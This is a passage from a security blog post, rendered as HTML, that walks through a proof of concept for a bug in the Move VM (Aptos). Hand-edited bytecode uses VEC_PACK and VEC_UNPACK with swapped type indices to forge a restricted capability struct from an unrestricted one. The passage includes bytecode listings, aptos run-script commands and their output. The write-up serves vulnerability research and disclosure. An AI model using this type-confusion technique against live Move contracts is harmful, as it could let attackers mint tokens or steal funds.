TwoCap</span><br><span class="line"></span><br><span class="line">IDENTIFIERS</span><br><span class="line">07 2B 35 -&gt; 09 6d 6f 6f 6e 5f 63 6f 69 6e moon_coin</span><br><span class="line">						06 4f 6e 65 43 61 70 OneCap</span><br><span class="line">						06 54 77 6F 43 61 70 TwoCap</span><br><span class="line">						0b 67 65 74 5f 6f 6e 65 5f 63 61 70 get_one_cap</span><br><span class="line">						0b 67 65 74 5f 74 77 6f 5f 63 61 70 get_two_cap</span><br><span class="line">						04 74 65 73 74 test	</span><br><span class="line"></span><br><span class="line">ADDRESS_IDENTIFIERS</span><br><span class="line">08 60 20 -&gt; 7fde 7f3f aac1 6e02 1829 c3b9 0f2f 65cd d13d 209b 55e5 2ded 1944 31c0 a4ec 6e63</span><br><span class="line"></span><br><span class="line">Code Head</span><br><span class="line">0000 010a</span><br><span class="line"></span><br><span class="line">Code Content</span><br><span class="line">1100 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">0c01 ST_LOC(index-&gt;register)</span><br><span class="line">1101 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">0c02 ST_LOC(index-&gt;register)</span><br><span class="line">0b02 MOVE_LOC(index-&gt;register)</span><br><span class="line">4004 01000000 00000000 VEC_PACK(index-&gt;SIGNATURES, length)</span><br><span class="line">01   POP</span><br><span class="line">0b01 MOVE_LOC(index-&gt;register)</span><br><span class="line">1102 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">02   RET</span><br></pre></td></tr></table></figure>
+
+<p>Let’s directly run this script first.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptos move run-script --compiled-script-path build/TestCoin/bytecode_scripts/poc.mv  --framework-local-dir ~/move-language/aptos-core/aptos-move/framework/aptos-framework</span><br></pre></td></tr></table></figure>
+
+<p>The <code>test</code> function will be invoked normally.</p>
+<img src="/2023/03/06/Move-compiler/image-20230605193130062.png" class="" title="image-20230605193130062">
+
+
+
+<p>Now, let’s try to directly call the <code>test</code> function using <code>TwoCap</code> instance.</p>
+<p>We can do this by modifying the code section in bytecode like below.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Code Content</span><br><span class="line">1100 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">0c01 ST_LOC(index-&gt;register)</span><br><span class="line">1101 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">0c02 ST_LOC(index-&gt;register)</span><br><span class="line">0b02 MOVE_LOC(index-&gt;register)</span><br><span class="line">4004 01000000 00000000 VEC_PACK(index-&gt;SIGNATURES, length)</span><br><span class="line">4604 01000000 00000000 VEC_UNPACK(index-&gt;SIGNATURES, length)</span><br><span class="line">1102 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">02   RET</span><br></pre></td></tr></table></figure>
+
+<p>(Don’t forget also changing the number of instructions in code hearder)</p>
+<p>After modification, we get the bytecode:</p>
+<img src="/2023/03/06/Move-compiler/image-20230605194812792.png" class="" title="image-20230605194812792">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptos move run-script --compiled-script-path test_poc.mv  --framework-local-dir ~/move-language/aptos-core/aptos-move/framework/aptos-framework</span><br></pre></td></tr></table></figure>
+
+<p>No surprises, we get an error:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Error&quot;: &quot;Simulation failed with status: Transaction Executed and Committed with Error CALL_TYPE_MISMATCH_ERROR&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Because the element in the vector is <code>TwoCap</code> type and we unpack this twocap on the stack, taking it as parameter to call <code>test</code>.</p>
+<p>But as we mentioned before, the <code>VecPack</code> actually miss a check when packing the elements. We can actually change the type index in the <code>Vecpack</code> instruction and also <code>VecUnpack</code>. Then we cange forge a <code>OneCap</code> using a <code>TwoCap</code> and vector operaion.</p>
+<img src="/2023/03/06/Move-compiler/image-20230605194901124.png" class="" title="image-20230605194901124">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptos move run-script --compiled-script-path test_poc1.mv  --framework-local-dir ~/move-language/aptos-core/aptos-move/framework/aptos-framework</span><br></pre></td></tr></table></figure>
+
+<p>We successfully call the <code>test()</code> function.</p>
+<img src="/2023/03/06/Move-compiler/image-20230605195133355.png" class="" title="image-20230605195133355">
+
+
+
+<p>Actually, we understand the bug now and we can simplify the code.</p>
+<ol>
+<li>call the get_two_cap(), the return value will be pushed on the stack.</li>
+<li>vecpack the value on the stack, using OneCap index</li>
+<li>unpack the value back on the stack, the value become OneCap</li>
+<li>call the test() using the value on stack</li>
+<li>ret</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1101 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">4003 01000000 00000000 VEC_PACK(index-&gt;SIGNATURES, length)</span><br><span class="line">4603 01000000 00000000 VEC_UNPACK(index-&gt;SIGNATURES, length)</span><br><span class="line">1102 CALL(index-&gt;FUNCTION_HANDLES)</span><br><span class="line">02 	 RET</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/03/06/Move-compiler/image-20230605195821389.png" class="" title="image-20230605195821389">
+
+<p>Our poc works.</p>
+<img src="/2023/03/06/Move-compiler/image-20230605200035176.png" class="" title="image-20230605200035176">
+
+
+
+<p>Moreover, it seems only we can do this via <code>struct</code>. I furthur test changing <code>u64</code> to<code>u128</code> and it failed. Internal implementation will raise an error INTERNAL_TYPE_ERROR for casting <code>u64</code> to <code>u128</code>.</p>
+<p>This example can happen in real-world application when OneCap is some capability type that should be restricted like <code>MintCapability</code>  and TwoCap are not like <code>ViewBalanceCapability</code>.</p>
+<p>Then it will easily cause loss of found or other severe results.</p>
+</div><!--!--></article></div><!--!--><!--!--></div><!--!--><!--!--></div></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/blogs/js/column.js"></script><script src="/blogs/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/blogs/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/blogs/js/main.js" defer></script><!--!--></body></html>
